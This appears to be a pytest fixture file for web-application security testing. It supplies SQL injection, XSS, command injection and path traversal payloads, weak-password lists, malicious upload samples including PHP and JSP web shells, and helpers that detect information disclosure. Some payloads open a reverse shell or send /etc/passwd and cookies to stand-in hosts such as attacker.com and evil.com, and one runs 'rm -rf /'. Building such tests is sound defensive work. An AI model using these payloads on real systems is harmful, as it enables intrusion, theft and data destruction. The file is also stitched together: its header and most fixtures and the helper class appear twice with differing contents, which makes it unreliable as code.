"""
Security Testing Configuration and Fixtures
"""

import pytest
import json
import time
import re
import hashlib
import secrets
import string
from typing import Dict, List, Any


"""
Security Testing Configuration and Fixtures
"""

import pytest
import json
import time
import re
import hashlib
import secrets
import string
from typing import Dict, List, Any


@pytest.fixture
def security_client(app):
    """Create a test client for security testing"""
    app.config['TESTING'] = True
    app.config['WTF_CSRF_ENABLED'] = False  # Disable CSRF for testing
    return app.test_client()


@pytest.fixture
def security_headers():
    """Common security headers for testing"""
    return {
        'Content-Type': 'application/json',
        'User-Agent': 'SecurityTest/1.0',
        'Accept': 'application/json'
    }


@pytest.fixture
def test_credentials():
    """Valid test credentials for authentication testing"""
    return {
        'valid_user': {
            'email': 'test@example.com',
            'password': 'ValidPassword123!'
        },
        'admin_user': {
            'email': 'admin@example.com', 
            'password': 'AdminPassword456!'
        }
    }


@pytest.fixture
def sql_injection_payloads():
    """Common SQL injection attack payloads"""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "' OR 'a'='a",
        "') OR '1'='1'--",
        "' OR '1'='1' /*",
        "1' AND '1'='1",
    ]


@pytest.fixture
def xss_payloads():
    """Common XSS attack payloads"""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<script>fetch('/api/users')</script>",
    ]


@pytest.fixture
def command_injection_payloads():
    """Common command injection attack payloads"""
    return [
        "; ls -la",
        "&& cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(whoami)",
        "; rm -rf /",
        "&& wget malicious.com/script.sh",
        "| nc -e /bin/sh attacker.com 4444",
        "; curl -X POST -d @/etc/passwd attacker.com",
        "&& ping -c 10 google.com",
    ]


@pytest.fixture
def path_traversal_payloads():
    """Common path traversal attack payloads"""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "../" * 10 + "etc/passwd",
        ".." + "/" * 100 + "etc/passwd",
        "file:///etc/passwd",
        "file://c:/windows/system32/drivers/etc/hosts",
    ]


@pytest.fixture
def password_attack_payloads():
    """Common password attack payloads"""
    return [
        "123456",
        "password",
        "admin",
        "guest",
        "root",
        "user",
        "test",
        "",
        " ",
        "a" * 100,
        "password123",
        "admin123",
    ]


@pytest.fixture
def expected_security_headers():
    """Expected security headers that should be present"""
    return {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=',
        'Content-Security-Policy': "default-src 'self'",
        'Referrer-Policy': ['strict-origin-when-cross-origin', 'no-referrer'],
        'Permissions-Policy': 'geolocation=()',
    }


@pytest.fixture
def security_test_data():
    """Test data for security validation"""
    return {
        'oversized_string': 'A' * 10000,
        'oversized_data': 'X' * 50000,  # Added this key
        'unicode_attack': '\u0000\u0001\u0002\u0003',
        'unicode_attacks': ['\u0000', '\u0001', '\u0002', '\u0003', '\x00'],  # Added this key
        'buffer_overflow': 'X' * 65536,
        'format_string': '%s%s%s%s%s%s%s%s%s%s',
        'null_bytes': 'test\x00.txt',
        'control_chars': '\r\n\t\b\f',
        'malicious_files': [
            {'name': 'test.exe', 'content': b'MZ\x90\x00'},
            {'name': 'script.php', 'content': b'<?php echo "test"; ?>'},
            {'name': 'payload.jsp', 'content': b'<% out.println("test"); %>'}
        ]
    }


@pytest.fixture
def rate_limit_tracker():
    """Track rate limiting for security tests"""
    return {
        'requests': [],
        'blocked_ips': set(),
        'last_request_time': {}
    }


class SecurityTestHelper:
    """Helper class for security testing utilities"""
    
    @staticmethod
    def generate_random_string(length: int = 10) -> str:
        """Generate a random string for testing"""
        return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    @staticmethod
    def hash_password(password: str) -> str:
        """Hash a password for testing"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    @staticmethod
    def extract_token_from_response(response_data: Dict) -> str:
        """Extract JWT token from response"""
        if isinstance(response_data, dict):
            return response_data.get('access_token', '')
        return ''
    
    @staticmethod
    def is_information_disclosure(response_text: str) -> bool:
        """Check if response contains potential information disclosure"""
        disclosure_patterns = [
            r'stack trace',
            r'traceback',
            r'exception',
            r'error.*line \d+',
            r'file.*\.py',
            r'mysql.*error',
            r'postgresql.*error',
            r'sqlite.*error',
            r'mongodb.*error',
        ]
        
        for pattern in disclosure_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    @staticmethod
    def validate_jwt_structure(token: str) -> bool:
        """Validate JWT token structure"""
        parts = token.split('.')
        return len(parts) == 3 and all(len(part) > 0 for part in parts)


@pytest.fixture
def security_helper():
    """Provide security test helper instance"""
    return SecurityTestHelper()


@pytest.fixture
def sql_injection_payloads():
    """Common SQL injection attack payloads"""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--"
    ]


@pytest.fixture
def xss_payloads():
    """Common XSS attack payloads"""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<input onfocus=alert('XSS') autofocus>",
        "<body onload=alert('XSS')>",
        "<div onclick=alert('XSS')>Click me</div>",
        "'\"><script>alert('XSS')</script>",
        "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "<link rel=stylesheet href=javascript:alert('XSS')>",
        "<style>@import'javascript:alert(\"XSS\")';</style>"
    ]


@pytest.fixture
def command_injection_payloads():
    """Common command injection attack payloads"""
    return [
        "; ls -la",
        "| whoami",
        "&& dir",
        "; cat /etc/passwd",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "; ping 127.0.0.1",
        "$(whoami)",
        "`id`",
        "${HOME}",
        "; rm -rf /",
        "| net user",
        "&& echo vulnerable",
        "; curl http://evil.com",
        "| wget http://evil.com/malware"
    ]


@pytest.fixture
def path_traversal_payloads():
    """Common path traversal attack payloads"""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    ]


@pytest.fixture
def password_attack_payloads():
    """Common weak passwords and attack patterns"""
    return {
        'weak_passwords': [
            'password',
            '123456',
            'admin',
            'root',
            'guest',
            'test',
            'qwerty',
            'abc123',
            'password123',
            '12345678'
        ],
        'brute_force_common': [
            'password', 'admin', '123456', 'password123',
            'admin123', 'root', 'guest', 'test', 'user',
            'login', 'pass', '1234', 'qwerty', 'abc123'
        ]
    }


@pytest.fixture
def security_test_data():
    """Comprehensive security test data"""
    return {
        'malicious_files': [
            {'name': 'virus.exe', 'content': b'MZ\x90\x00\x03\x00\x00\x00'},  # PE header
            {'name': 'script.php', 'content': b'<?php system($_GET[\'cmd\']); ?>'},
            {'name': 'shell.jsp', 'content': b'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'},
            {'name': '../../../etc/passwd', 'content': b'root:x:0:0:root:/root:/bin/bash'},
        ],
        'oversized_data': 'A' * 10000,  # 10KB of A's
        'unicode_attacks': [
            '\u0000',  # Null byte
            '\u202e',  # Right-to-left override
            '\ufeff',  # Byte order mark
            '\u2028',  # Line separator
            '\u2029'   # Paragraph separator
        ]
    }


class SecurityTestHelper:
    """Helper class for security testing utilities"""
    
    @staticmethod
    def generate_random_string(length: int = 10) -> str:
        """Generate a random string for testing"""
        return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    @staticmethod
    def hash_password(password: str) -> str:
        """Simple password hashing for testing"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    @staticmethod
    def is_valid_email(email: str) -> bool:
        """Check if email format is valid"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    @staticmethod
    def extract_tokens_from_response(response_text: str) -> List[str]:
        """Extract potential tokens/secrets from response"""
        # Look for JWT tokens, API keys, session IDs, etc.
        patterns = [
            r'[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',  # JWT
            r'[A-Fa-f0-9]{32,}',  # Hex tokens
            r'[A-Za-z0-9+/]{20,}={0,2}',  # Base64
            r'sk_[a-zA-Z0-9]{24,}',  # Stripe-like keys
            r'pk_[a-zA-Z0-9]{24,}',  # Public keys
        ]
        
        tokens = []
        for pattern in patterns:
            tokens.extend(re.findall(pattern, response_text))
        
        return list(set(tokens))  # Remove duplicates
    
    @staticmethod
    def check_information_disclosure(response_text: str, status_code: int) -> List[str]:
        """Check for information disclosure in responses"""
        disclosures = []
        
        # Check for sensitive information patterns
        sensitive_patterns = {
            'Stack traces': r'Traceback|at line \d+|Exception in|Error in',
            'Database errors': r'SQL syntax|mysql_|ORA-\d+|Microsoft.*ODBC',
            'File paths': r'[A-Za-z]:\\[^<>"|]*|/home/[^<>"|]*|/var/[^<>"|]*',
            'Version info': r'Apache/[\d.]+|nginx/[\d.]+|PHP/[\d.]+',
            'Internal IPs': r'192\.168\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+',
            'Comments': r'<!--.*?-->',
            'Debug info': r'DEBUG|TRACE|console\.log'
        }
        
        for disclosure_type, pattern in sensitive_patterns.items():
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                disclosures.append(disclosure_type)
        
        # Check for verbose error messages
        if status_code >= 500 and len(response_text) > 500:
            disclosures.append('Verbose error messages')
        
        return disclosures


@pytest.fixture
def security_helper():
    """Provide security testing helper instance"""
    return SecurityTestHelper()


@pytest.fixture
def rate_limit_tracker():
    """Track rate limiting for testing"""
    class RateLimitTracker:
        def __init__(self):
            self.requests = []
        
        def record_request(self, endpoint: str, timestamp: float = None):
            if timestamp is None:
                timestamp = time.time()
            self.requests.append({'endpoint': endpoint, 'timestamp': timestamp})
        
        def get_request_count(self, endpoint: str, time_window: float = 60.0) -> int:
            """Get request count for endpoint within time window (seconds)"""
            current_time = time.time()
            recent_requests = [
                req for req in self.requests
                if req['endpoint'] == endpoint and current_time - req['timestamp'] <= time_window
            ]
            return len(recent_requests)
        
        def clear(self):
            self.requests.clear()
    
    return RateLimitTracker()
